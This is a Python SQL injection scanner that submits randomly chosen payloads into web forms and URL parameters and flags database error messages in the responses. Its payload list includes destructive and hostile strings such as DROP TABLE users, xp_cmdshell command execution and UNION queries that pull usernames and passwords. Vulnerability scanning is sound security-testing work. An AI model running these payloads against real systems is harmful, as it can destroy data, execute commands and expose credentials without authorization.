# scanner/sqli_scanner.py

import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
from bs4 import BeautifulSoup
import logging
import random
import re

# Define SQL error messages to look for in responses
SQL_ERRORS = {
    "MySQL": [
        "you have an error in your sql syntax;",
        "warning: mysql",
        "unclosed quotation mark after the character string"
    ],
    "PostgreSQL": [
        "pg_query():",
        "pg_exec()",
        "postgresql"
    ],
    "SQLServer": [
        "microsoft sql server",
        "sql server",
        "unclosed quotation mark"
    ],
    "Oracle": [
        "quoted string not properly terminated",
        "oracle error"
    ],
    "SQLite": [
        "sqlite3::exception",
        "sqlite error"
    ]
}

# Define SQL payloads categorized by injection technique
SQL_PAYLOADS = {
    "basic": [
        "'", "\"", "`",
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "'; --", "\"; --",
        "'; #", "' OR '1'='1' --",
        "\" OR \"1\"=\"1\" --",
        "' OR '1'='1' /*",
        "admin' --", "admin' #", "admin'/*",
        "')", "\"))",
        "') OR ('1'='1", "\")) OR (\"1\"=\"1"
    ],
    "union_based": [
        "' UNION SELECT NULL--",
        "' UNION SELECT 1--",
        "' UNION SELECT username, password FROM users--",
        "' UNION SELECT table_name FROM information_schema.tables--",
        "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--"
    ],
    "error_based": [
        "' AND 1=CONVERT(INT, (SELECT @@version))--",
        "' AND 1=(SELECT COUNT(*) FROM tablenames)--",
        "' AND 1=CAST((SELECT TOP 1 name FROM sysobjects WHERE xtype='U') AS INT)--",
        "' OR 1=1 WAITFOR DELAY '0:0:5'--",
        "' OR 1=1 AND SLEEP(5)--"
    ],
    "time_based": [
        "'; WAITFOR DELAY '0:0:5'--",
        "'; SLEEP(5)--",
        "' OR SLEEP(5)--",
        "' OR pg_sleep(5)--",
        "' OR BENCHMARK(1000000,MD5('test'))--"
    ],
    "advanced": [
        "'/**/OR/**/'1'='1",
        "' OR '1'='1'/*",
        "' OR 1=1--",
        "' OR 1=1#",
        "'; EXEC xp_cmdshell('dir')--",
        "'; EXECUTE IMMEDIATE 'DROP TABLE users'--",
        "' OR 1=1/**/--",
        "' OR '1'='1'/**/--",
        "'; DROP TABLE users--",
        "%27%20OR%20%271%27%3D%271",  # URL-encoded: ' OR '1'='1
        "\" OR \"1\"=\"1\"--",
        "%22%20OR%20%221%22%3D%221"  # URL-encoded: " OR "1"="1
    ]
}

def get_random_payloads(sql_payloads, num_payloads=5):
    """
    Select a random subset of payloads from each category.
    
    Args:
        sql_payloads (dict): Dictionary containing payload categories.
        num_payloads (int): Number of payloads to select from each category.
    
    Returns:
        list: A list of selected payloads.
    """
    selected_payloads = []
    for category, payloads in sql_payloads.items():
        if len(payloads) <= num_payloads:
            selected_payloads.extend(payloads)
        else:
            selected_payloads.extend(random.sample(payloads, num_payloads))
    return selected_payloads

def extract_forms(html_content, base_url):
    """
    Extract all forms from the given HTML content.
    
    Args:
        html_content (str): HTML content of the page.
        base_url (str): Base URL to resolve relative form action URLs.
    
    Returns:
        list: A list of dictionaries containing form details.
    """
    soup = BeautifulSoup(html_content, "html.parser")
    forms = []
    for form in soup.find_all("form"):
        form_details = {}
        action = form.attrs.get("action")
        method = form.attrs.get("method", "get").lower()
        action = urljoin(base_url, action) if action else base_url
        inputs = []
        for input_tag in form.find_all(["input", "textarea"]):
            input_type = input_tag.attrs.get("type", "text")
            name = input_tag.attrs.get("name")
            value = input_tag.attrs.get("value", "")
            inputs.append({"type": input_type, "name": name, "value": value})
        form_details["action"] = action
        form_details["method"] = method
        form_details["inputs"] = inputs
        forms.append(form_details)
    return forms

def perform_sqli_scan(url, depth=1, verbose=False):
    """
    Perform SQL Injection scan on the given URL, handling both GET and POST requests.
    
    Args:
        url (str): The target URL.
        depth (int): The depth of scanning (currently unused in this function).
        verbose (bool): Enable verbose output.
    
    Returns:
        list: A list of detected SQLi vulnerabilities.
    """
    vulnerabilities = []
    session = requests.Session()
    
    # Configure logging
    if verbose:
        logging.basicConfig(level=logging.DEBUG, format='[%(levelname)s] %(message)s')
    else:
        logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
    
    parsed_url = urlparse(url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
    
    try:
        response = session.get(url, timeout=10, verify=False)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        logging.error(f"Failed to fetch the URL {url}: {e}")
        return vulnerabilities
    
    forms = extract_forms(response.text, base_url)
    if not forms:
        logging.info("No forms found on the page to scan for SQLi.")
    else:
        logging.info(f"Found {len(forms)} form(s) to scan for SQLi.")
    
    for form in forms:
        action = form["action"]
        method = form["method"]
        inputs = form["inputs"]
        logging.debug(f"Scanning form with action: {action} and method: {method}")
        
        # Prepare form data with payloads
        for input_field in inputs:
            input_name = input_field["name"]
            input_type = input_field["type"]
            if input_name is None:
                continue  # Skip inputs without a name attribute
            original_value = input_field["value"]
            logging.debug(f"Injecting payload into input: {input_name} with original value: {original_value}")
            
            # Select a subset of payloads dynamically
            injected_payloads = get_random_payloads(SQL_PAYLOADS, num_payloads=5)
            
            for payload in injected_payloads:
                # Prepare the payload data
                data = {}
                for field in inputs:
                    name = field["name"]
                    value = field["value"]
                    if name == input_name:
                        data[name] = value + payload
                    else:
                        data[name] = value
                logging.debug(f"Submitting payload: {payload} in field: {input_name}")
                
                try:
                    if method == "post":
                        injected_response = session.post(action, data=data, timeout=10, verify=False)
                    else:
                        # For GET method, append query parameters
                        injected_response = session.get(action, params=data, timeout=10, verify=False)
                    logging.debug(f"Received response with status code: {injected_response.status_code}")
                    
                    # Analyze the response for SQL error messages
                    for db, error_messages in SQL_ERRORS.items():
                        for error in error_messages:
                            if re.search(re.escape(error), injected_response.text, re.IGNORECASE):
                                vulnerability = {
                                    "form_action": action,
                                    "method": method.upper(),
                                    "input_field": input_name,
                                    "payload": payload,
                                    "db": db,
                                    "error": error,
                                    "url": injected_response.url
                                }
                                logging.warning(f"Possible SQLi vulnerability detected: {vulnerability}")
                                vulnerabilities.append(vulnerability)
                                # Once a vulnerability is found for this payload, move to the next input
                                break
                        else:
                            continue  # Only executed if the inner loop did NOT break
                        break  # Inner loop was broken, so break the outer loop as well
                except requests.exceptions.RequestException as e:
                    logging.error(f"Error occurred while submitting form to {action}: {e}")
                    continue
    
    # Additionally, scan URL parameters (GET requests)
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    
    if query_params:
        logging.info(f"Found {len(query_params)} parameter(s) to scan for SQLi in URL.")
        PAYLOADS_PER_CATEGORY = 5
        for param in query_params:
            original_values = query_params[param]
            logging.debug(f"Scanning URL parameter: {param} with value(s): {original_values}")
    
            # Select a subset of payloads dynamically
            injected_payloads = get_random_payloads(SQL_PAYLOADS, PAYLOADS_PER_CATEGORY)
    
            for payload in injected_payloads:
                # Create a copy of the original parameters
                injected_params = query_params.copy()
                # Inject the payload into the current parameter
                injected_params[param] = [value + payload for value in original_values]
    
                # Reconstruct the URL with injected parameters
                injected_query = urlencode(injected_params, doseq=True)
                injected_url = urlunparse((
                    parsed_url.scheme,
                    parsed_url.netloc,
                    parsed_url.path,
                    parsed_url.params,
                    injected_query,
                    parsed_url.fragment
                ))
    
                logging.debug(f"Injected URL: {injected_url}")
    
                try:
                    response = session.get(injected_url, timeout=10, verify=False)
                    logging.debug(f"Received response with status code: {response.status_code}")
    
                    # Analyze the response for SQL error messages
                    for db, error_messages in SQL_ERRORS.items():
                        for error in error_messages:
                            if re.search(re.escape(error), response.text, re.IGNORECASE):
                                vulnerability = {
                                    "parameter": param,
                                    "payload": payload,
                                    "db": db,
                                    "error": error,
                                    "url": injected_url
                                }
                                logging.warning(f"Possible SQLi vulnerability detected: {vulnerability}")
                                vulnerabilities.append(vulnerability)
                                # Once a vulnerability is found for this payload, move to the next parameter
                                break
                        else:
                            continue  # Only executed if the inner loop did NOT break
                        break  # Inner loop was broken, so break the outer loop as well
    
                except requests.exceptions.RequestException as e:
                    logging.error(f"Error occurred while requesting {injected_url}: {e}")
                    continue
    
    return vulnerabilities
